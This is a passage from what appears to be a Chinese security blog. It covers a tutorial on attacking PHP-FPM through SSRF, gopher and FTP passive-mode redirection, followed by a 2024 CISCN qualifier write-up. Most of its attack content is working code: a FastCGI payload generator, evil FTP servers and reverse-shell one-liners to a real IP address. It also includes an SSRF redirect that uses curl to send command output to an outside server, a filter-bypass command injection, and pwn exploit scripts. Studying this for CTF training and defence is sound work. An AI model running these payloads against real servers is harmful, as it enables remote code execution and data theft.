socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False #return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) # 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request #self.sock.send(request) #self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND #self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27; #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; # 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了 #response = client.request(params, content) #print(force_text(response)) request_ssrf = urlparse.quote(client.request(params, content)) print(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + request_ssrf) 用法依旧: 1python fpm2.py -c &quot;&lt;?php system(&#x27;ls&#x27;); exit(); ?&gt;&quot; -p 9000 127.0.0.1 /var/www/html/index.php ​ 注:这里执行的命令的起始路径是我们传入的这个文件,例如/var/www/html/index.php这个 神了,从下午2点搭这个b环境打ssrf一直有问题,mb的最后发现是hcj的sb docker模板拉的是轻量级煞笔php,最后自己重新拉了个ubuntu配的php,nginx,php-fpm才好使,服了!!!!! 使用Gopherusgopherus确实牛逼,输入:python2 gopherus.py --exploit fastcgi后路径再输入已确定存在的php文件的路径,再输入要执行的命令即可. 效果: SSRF中的攻击点curl_exec()很经典的能进行ssrf的函数,能支持file,dict,gopher等伪协议. file_get_contents()可以从指定路径来获取资源,不支持gopher协议 sockopen()这个函数会使用socket跟服务器建立tcp连接，传输原始数据。 FTP攻击FPM&#x2F;FastCGIFTP的两种模式​ FTP会话包含了两个通道，控制通道和数据传输通道，FTP的工作有两种模式，一种是主动模式，一种是被动模式，以FTP Server为参照：主动模式，服务器主动连接客户端传输；被动模式，等待客户端的连接。 主动模式: ​ 在主动模式下，FTP客户端随机开启一个大于1024的端口N向服务器的21号端口发起连接，然后开放N+1号端口进行监听，并向服务器发出PORT N+1命令。服务器接收到命令后，会用其本地的FTP数据端口（通常是20）来连接客户端指定的端口N+1，进行数据传输。 被动模式: ​ 在被动模式下，FTP库户端随机开启一个大于1024的端口N向服务器的21号端口发起连接，同时会开启N+1号端口。然后向服务器发送PASV命令，通知服务器自己处于被动模式。服务器收到命令后，会开放一个大于1024的端口P进行监听，然后用PORT P命令通知客户端，自己的数据端口是P。客户端收到命令后，会通过N+1号端口连接服务器的端口P，然后在两个端口之间进行数据传输。 ​ 总的来说，主动模式的FTP是指服务器主动连接客户端的数据端口，被动模式的FTP是指服务器被动地等待客户端连接自己的数据端口。 ​ 由此可见,在被动模式中,FTP客户端和服务端的数据传输端口是由服务端指定的,实际上除了端口,服务器的地址也是可以被指定的.由于 FTP 和 HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的： 1227 Entering Passive Mode(192,168,9,2,4,8) 227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语，而 (192,168,9,2,4,8) 代表让客户端到连接 192.168.9.2 的 4 * 256 + 8 &#x3D; 1032 端口。 ​ 这样，假如我们指定 (127,0,0,1,0,9000) ，那么便可以将地址和端口指到 127.0.0.1:9000，也就是本地的 9000 端口。同时由于 FTP 的特性，其会把传输的数据原封不动的发给本地的 9000 端口，不会有任何的多余内容。如果我们将传输的数据换为特定的 Payload 数据，那我们便可以攻击内网特定端口上的应用了。在这整个过程中，FTP 只起到了一个重定向 Payload 的内容。 写入文件例: 1234&lt;?phphighlight_file(__FILE__); file_put_contents($_GET[&#x27;file&#x27;], $_GET[&#x27;data&#x27;]);?&gt; 一个经典的写文件函数,但是假如没有权限写文件我该怎么利用呢?那么就可以利用ssrf来打. ssrf通常能使用gopher:&#x2F;&#x2F;协议来打,但是这个函数不支持,如果内网存在PHP-FPM的话,那么我们就可以利用FTP的被动模式来攻击FPM. 起一个伪ftp客户端: 123456789101112131415161718192021222324252627282930# -*- coding: utf-8 -*-# evil_ftp.pyimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind((&#x27;0.0.0.0&#x27;, 23)) # ftp服务绑定23号端口s.listen(1)conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#x27;331 Please specify the password.\\n&#x27;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#x27;230 Login successful.\\n&#x27;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)#Size /conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)#EPSV (1)conn.send(b&#x27;150 ok\\n&#x27;)#PASVconn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n&#x27;) #STOR / (2)# &quot;127,0,0,1&quot;PHP-FPM服务为受害者本地，&quot;9000&quot;为为PHP-FPM服务的端口号conn.send(b&#x27;150 Permission denied.\\n&#x27;)#QUITconn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() 使用Gopherus生成一个打FPM反弹shell的payload,只取_后面的值. 123python gopherus.py --exploit fastcgi/var/www/html/index.php bash -c &quot;bash -i &gt;&amp; /dev/tcp/103.150.11.108/2333 0&gt;&amp;1&quot; nc监听2333端口,传参即可反弹shell 读取写回文件​ 例如CVE-2021-3129这个漏洞,核心就是传入 file_get_contents() 和 file_put_contents() 这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar 反序列化，达到RCE的效果. 示例代码: 1234&lt;?php$contents = file_get_contents($_GET[&#x27;viewFile&#x27;]);file_put_contents($_GET[&#x27;viewFile&#x27;], $contents);?&gt; 可以看到,这段代码的主要功能就是先读取一个文件,再把这个文件的内容写到这个文件里,相当于啥也没干. file_get_contents我们经常用来进行ssrf,其支持各种伪协议,假如我们使用ftp协议的话,传入 viewFile=ftp://evil-server/file.txt的话,那么就会发生以下步骤: 先通过file_get_contents()连接到我们的ftp服务器,下载file.txt 再通过file_put_contents()连接到ftp服务器,并将其上传回file.txt ​ 那么我们依旧搭一个evilftp服务器,先从服务器上下载文件后,当他试图传回文件的时候,我们再告诉他把文件发送到127.0.0.1:9000,这样我们就可以向目标主机本地的PHP-FPM发送一个任意的数据包,然后就能任意代码执行了. 依旧使用Gopherus生成payload: 123python gopherus.py --exploit fastcgi/var/www/html/index.php bash -c &quot;bash -i &gt;&amp; /dev/tcp/103.150.11.108/2333 0&gt;&amp;1&quot; evilftpredict.py: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# -*- coding: utf-8 -*-# @Time : 2021/1/13 6:56 下午# @Author : tntaxin# @File : ftp_redirect.py# @Software:import socketfrom urllib.parse import unquote# 对gopherus生成的payload进行一次urldecodepayload = unquote(&quot; &quot;)payload = payload.encode(&#x27;utf-8&#x27;)host = &#x27;0.0.0.0&#x27;port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式的passvie port,监听到1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1: conn, address = sk.accept() conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # USER aaa\\r\\n 客户端传来用户名 if count == 1: conn.send(b&quot;220 ready\\n&quot;) else: conn.send(b&quot;200 ready\\n&quot;) print(conn.recv(20)) # TYPE I\\r\\n 客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本 if count == 1: conn.send(b&quot;215 \\n&quot;) else: conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # SIZE /123\\r\\n 客户端询问文件/123的大小 if count == 1: conn.send(b&quot;213 3 \\n&quot;) else: conn.send(b&quot;300 \\n&quot;) print(conn.recv(20)) # EPSV\\r\\n&#x27; conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # PASV\\r\\n 客户端告诉服务端进入被动连接模式 if count == 1: conn.send(b&quot;227 127,0,0,1,4,210\\n&quot;) # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b&quot;227 127,0,0,1,35,40\\n&quot;) # 端口计算规则：35*256+40=9000 print(conn.recv(20)) # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\n if count == 1: conn.send(b&quot;125 \\n&quot;) # 告诉客户端可以开始数据连接了 # 新建一个socket给服务端返回我们的payload print(&quot;建立连接!&quot;) conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(&quot;断开连接!&quot;) else: conn.send(b&quot;150 \\n&quot;) print(conn.recv(20)) exit() # 第一次连接是下载文件，需要告诉客户端下载已经结束 if count == 1: conn.send(b&quot;226 \\n&quot;) conn.close() count += 1","categories":[{"name":"PHP","slug":"PHP","permalink":"https://m1racle-7.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://m1racle-7.github.io/tags/PHP/"}]},{"title":"2024ciscn初赛WP","slug":"2024ciscn初赛WP","date":"2024-05-20T16:00:00.000Z","updated":"2024-10-30T11:20:58.827Z","comments":true,"path":"2024/05/21/2024ciscn初赛WP/","permalink":"https://m1racle-7.github.io/2024/05/21/2024ciscn%E5%88%9D%E8%B5%9BWP/","excerpt":"","text":"解题过程WebSimple_php进去就给了源码 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);error_reporting(0);if(isset($_POST[&#x27;cmd&#x27;]))&#123; $cmd = escapeshellcmd($_POST[&#x27;cmd&#x27;]); if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\\?|wget|\\&#x27;|\\&quot;|id|whoami/i&#x27;, $cmd)) &#123; system($cmd);&#125;&#125;show_source(__FILE__);?&gt; 一看这逆天正则,几乎把所有的命令都禁了,真nb啊,不过看了半天发现他的php的命令没过,并且-也没被过滤,所以就有可乘之机辣!!! 可以利用php -e命令来执行php代码 不过这个逆天正则把’和”都过滤了,以及一堆特殊符号 真别说,搜搜咋执行的时候找到了第12届国赛的题,有了思路 真帅吧,这操作,字符串转16进制的话会有字母,也就是这是一个字符串,需要单双引号,但是被禁用了,不过可以把他转成36进制,这样就不含字母了,这思路真nb 1echo base_convert(&#x27;ls&#x27;, 36, 10); 可以用这个函数来转换字符串, base_convert(1751504350,10,36)(base_convert(17523,10,36));这样的话就构造成了system(dir) 可以发现报错的最前面有个index.php,说明执行成功,完美~ 不过base_convert这个函数有个缺陷只能构造出0-9,a-z,其他整不出来,有些可惜,不过思路打开了 其实如果想继续用这个构造的话可以搭配其他进制转换函数,不过构造会有点恶心.所以搜搜其他解法, 发现php有个特性,想要不带单双引号的整字符串的话,可以在它的前面加上下划线,这样就会被识别成字符串,所以就可以利用另一个进制转换函数hex2bin来构造执行命令了 直接利用php的bin2hex来字符串转成16进制即可 1echo(bin2hex(&quot;system(&#x27;cat /etc/passwd&#x27;);&quot;)); 看根目录没flag,猜测可能在数据库里 &#x2F;etc&#x2F;passwd里面有mysql数据库,爆出root&#x2F;root用户名密码 123echo(bin2hex(&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases&#x27;`&quot;));echo(bin2hex(&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;&#x27;`&quot;));echo(bin2hex(&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select* from F1ag_Se3Re7&#x27;`&quot;)); easycms_revenge看题目描述是昨天的easycms升级版，但最后好像也没升级啥。日，昨天找到了ssrf点，但没打通，可惜了 首先他是一个xunrui的cms，github上有他源码https://github.com/dayrui/xunruicms?tab=readme-ov-file 然后在第一天的cms里给了flag.php的源码 1234567891011if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123; echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;; return;&#125;else&#123; system($_GET[&#x27;cmd&#x27;]);&#125; 由于这个REMOTE_ADDR伪造不了,只能通过ssrf来打,之前vecctf有个类似的题,所以搜搜xunruicms的漏洞,看看有没有关于ssrf的. 还可以发现有个贵州cms和他洞差不多 可以看到他有个qrcode的ssrf,不过这个cnvd不公开,得自己审下源码 所以需要咱们down下来自己分析 ,直接先搜搜qrcode,在这几个文件里来回审审 可以看到,在Helper这个文件里面存在着这个 1index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&#x27;.urlencode($thumb).&#x27;&amp;text=&#x27;.urlencode($text).&#x27;&amp;size=&#x27;.$size.&#x27;&amp;level=&#x27;.$level; 看他上面注释也能知道这是个二维码调用的函数,然后再看他参数,基本都能被咱们控制,而且这个thumb参数是可以输入url远程调用二维码的,因此就给了咱们机会.可以实现SSRF!!!! 这样思路就清晰了,直接在自己vps上整个恶意文件,伪装成二维码,然后重定向到flag.php,再用cmd来执行命令,完美~~~~ 构造恶意文件: 12345#define width 1000#define height 1000&lt;?phpheader(&quot;location:http://127.0.0.1/flag.php?cmd=curl http://59.110.28.63:6666/?id=`/readflag`&quot;);?&gt; 利用header来重定向到flag.php,接着通过curl来外带命令执行结果,再开个python http服务来接收即可. http://eci-2ze4u7rbddg2d2cl58s7.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://59.110.28.63/1.php&amp;text=1&amp;size=10&amp;level=10 日,之前一直读的&#x2F;flag,没有tmd 之后再好好看根目录才发现有个readflag,眼瞎了 flag{5fb5c22e-5667-47c3-9959-0fc6e43f483e} Misc大学生安全测试能力调研问卷填就完事了 火锅链观光打卡 安装MetaMask，然后连接钱包，然后答题 然后搞7个以上，兑换flag 通风机下载下来的文件是mwp文件 搜索发现是西门子的啥玩意，去官网下软件 然后就是西门子的，用STEP 7 MicroWIN SMART打开 但是没能成功打开，用010查看，发现文件头有误 补全文件头，然后就正常打开了 发现有备注信息，里面的内容是base64，解码得到flag base64（没记错的话，大概率没记错） Power Trajectory Diagram让gpt写个读npz文件的东西 1234567891011121314import numpy as np# 假设你的 .npz 文件名是 &#x27;data.npz&#x27;filename = &#x27;attachment.npz&#x27;# 读取 .npz 文件data = np.load(filename)# 打印文件中包含的数组名称print(data.files)# 访问每个数组for array_name in data.files: print(f&quot;&#123;array_name&#125;: &#123;data[array_name]&#125;&quot;) 通过input、index、trace的内容可以分析出，它大概有13组数据每组数据对应一幅图，有点类似键盘敲击的 1234567891011121314151617import numpy as npf = np.load(&#x27;attachment.npz&#x27;)ip = f[&#x27;input&#x27;]tr = f[&#x27;trace&#x27;]result_indices = []for i in range(13): trace_slice = tr[i * 40:(i + 1) * 40] input_slice = ip[i * 40:(i + 1) * 40] min_indices = [np.argmin(trace) for trace in trace_slice] max_variation_index = np.argmax(min_indices) result_indices.append(input_slice[max_variation_index])print(&#x27;&#x27;.join(map(str, result_indices))) 神秘文件将ppt文件转换为zip，文档打开找到，ppt信息里面也可以找到，懒得截图了 Part1:flag{e （算了还是截了） 解密 part2:675efb 里面有个word，搞成zip解压 接着凯撒爆破base64 PArt3:3-34 alt+F11打开vba代码 问gpt是RC4（一直以为要写解密脚本！！！） Payt4:6f-40 PPT给图片掀开 base64解密 pArt5:5f-90d 第五页ppt 多轮base64解密 ParT6:d-2 还是改为zip解压出来的题目里找到的 base64 PART7&#x3D;22b3 对 对 对 paRt8:87e 密文在前面，这回真不截了 替换也有提示懒得截了 parT9:dee 还是那个文件夹里 解密 PARt10:9} 维吉尼亚 key也有懒得解了 CryptoOvOsage原文 123456789101112131415161718192021222324252627from Crypto.Util.number import *from secret import flagnbits = 512p = getPrime(nbits)q = getPrime(nbits)n = p * qphi = (p-1) * (q-1)while True: kk = getPrime(128)//128 rr = kk + 2 e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1 if gcd(e, phi) == 1: breakm = bytes_to_long(flag)c = pow(m, e, n)e = e &gt;&gt; 200 &lt;&lt; 200 #高位攻击print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;e = &#123;e&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;)&quot;&quot;&quot;n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823&quot;&quot;&quot; 发现是e的高位攻击，然后搞出e与p的关系 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from tqdm import tqdmfrom Crypto.Util.number import long_to_bytes, inverse, GCDfrom sage.all import PolynomialRing, Zmod, RealField, ZZdef get_full_p(p_high, n, d_high, bits): PR = PolynomialRing(Zmod(n), &#x27;x&#x27;) x = PR.gen() f = x + p_high roots = f.small_roots(X=2 ** (bits + 4), beta=0.4) if roots: x0 = roots[0] p = GCD(x0 + p_high, n) return ZZ(p) return Nonedef find_p_high(e, n, bits): PR = PolynomialRing(RealField(1000), &#x27;X&#x27;) X = PR.gen() rr = e // n kk = rr - 2 f = (kk + rr) * X ** 2 + (rr * (n + 1) + 65538) * X + rr * n - e * X results = f.roots() if results: for root in results: p_high = int(root[0]) &gt;&gt; 4 &lt;&lt; 4 p = get_full_p(p_high, n, e, bits) if p and str(p)[0] == &#x27;9&#x27;: return p return Nonedef main(): n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967 e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104 c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823 p = find_p_high(e, n, 200) if p: q = n // p print(f&quot;p: &#123;p&#125;&quot;) print(f&quot;q: &#123;q&#125;&quot;) rr = e // n kk = rr - 2 new_e = 65537 + kk * p + rr * ((p + 1) * (q + 1)) + 1 print(f&quot;e: &#123;new_e&#125;&quot;) phi_n = (p - 1) * (q - 1) d = inverse(new_e, phi_n) print(f&quot;d: &#123;d&#125;&quot;) m = pow(c, d, n) decrypted_message = long_to_bytes(m) print(f&quot;flag: &#123;decrypted_message&#125;&quot;) else: passif __name__ == &quot;__main__&quot;: main()# p: 9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091# q: 11287710353955888973017088237331029225772085726230749705174733853385754367993775916873684714795084329569719147149432367637098107466393989095020167706071637# e: 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226053225696381145049303216018329937626866082580192534109310743249# d: 40562370691549621318549577950032175038658590691131469091909407935553676331176752570788349128822472320141028057032815128710763002566130430070603179406801031103153868717775020292889882861093052194287247276202665973400686789725153480640714911756153417332445558986048503928766869105149777013026905407852425839049# flag: b&#x27;flag&#123;b5f771c6-18df-49a9-9d6d-ee7804f5416c&#125;&#x27; 古典密码Atbash Cipher 加上lg傻傻的交了一遍，发现不对，看到了lg再去栅栏解密一下 Pwngostack首先通过自动补全符号表来理解程序的结构和功能。接着，使用checksec工具检查可执行文件的安全特性，发现只开了NX，分析之后锁定溢出点 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*- coding=utf-8 -*-from pwn import *from LibcSearcher import *from struct import packimport timeimport randomfrom ctypes import *fname = &#x27;F:/betwen/题库/24国赛/gostack&#x27;context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)elf = ELF(fname)libc = elf.libcrc=lambda *args:p.recv(*args)ru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sa=lambda a,b:p.sendafter(a,b)sla=lambda a,b:p.sendlineafter(a,b)ls=lambda *args:log.success(*args)ia=lambda *args:p.interactive()pl=lambda *args:print(*args)ts=lambda *args:time.sleep(*args)l8 = lambda x:x.ljust(8,b&#x27;\\x00&#x27;)p = remote(&quot;8.147.128.251&quot;,&quot;44715&quot;)def pwn(): syscall = 0x0000000000404043 rax_ret = 0x000000000040f984 rdi_6_ret = 0x00000000004a18a5 rsi_ret = 0x000000000042138a rdx_ret = 0x00000000004944ec ru(&#x27;message :&#x27;) payload = b&#x27;a&#x27;*0x100+p64(elf.bss())+p64(0x10)+p64(0)*0x18 payload += p64(rdi_6_ret)+p64(0)*6+p64(rsi_ret)+p64(elf.bss()+0x200)+p64(rdx_ret)+p64(0x100)+p64(rax_ret)+p64(0)+p64(syscall) payload += p64(rdi_6_ret)+p64(elf.bss()+0x200)+p64(0)*5 payload += p64(rdi_6_ret)+p64(elf.bss()+0x200)+p64(0)*5 payload += p64(rdi_6_ret)+p64(elf.bss()+0x200)+p64(0)*5+p64(rsi_ret)+p64(0)+p64(rdx_ret)+p64(0)+p64(rax_ret)+p64(59)+p64(syscall) sl(payload) input() sd(&#x27;/bin/sh\\x00&#x27;) ia()pwn() orange_cat_diaryhouse of orange free出一个unsorted chunk，然后泄露libc地址，用use after free劫持malloc hook即可 exp： 12345678910111213141516171819202122232425262728293031323334353637from pwn import *context.log_level=&#x27;debug&#x27;p=remote(&quot;8.147.133.230&quot;,&quot;33569&quot;)libc=ELF(&#x27;F:\\pwn\\libc-2.23.so&#x27;)def choice(i): p.sendlineafter(&#x27;choice:&#x27;,str(i))def add(size,content): choice(1) p.sendlineafter(&#x27;content:&#x27;,str(size)) p.sendafter(&#x27;content:&#x27;,content)def edit(size,content): choice(4) p.sendlineafter(&#x27;content:&#x27;,str(size)) p.sendafter(&#x27;content:&#x27;,content)p.sendafter(&#x27;name.&#x27;,&#x27;adadawdawdawfwewfwe&#x27;)add(0x68,b&#x27;a&#x27;)edit(0x70,b&#x27;a&#x27;*0x68+p64(0x0f91))add(0x1000,b&#x27;a&#x27;)add(0x18,b&#x27;a&#x27;*8)choice(2)libc_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:]+b&#x27;\\0\\0&#x27;)-1640-0x10-libc.sym[&#x27;__malloc_hook&#x27;]success(&#x27;libc_addr: &#x27;+hex(libc_addr))one=[0x45226,0x4527a,0xf03a4,0xf1247]add(0x68,b&#x27;a&#x27;)choice(3)edit(0x10,p64(libc_addr+libc.sym[&#x27;__malloc_hook&#x27;]-0x23))add(0x68,b&#x27;a&#x27;)add(0x68,b&#x27;a&#x27;*(0x13)+p64(libc_addr+one[2]))choice(1)p.sendlineafter(&#x27;content:&#x27;,str(0x20))p.interactive() 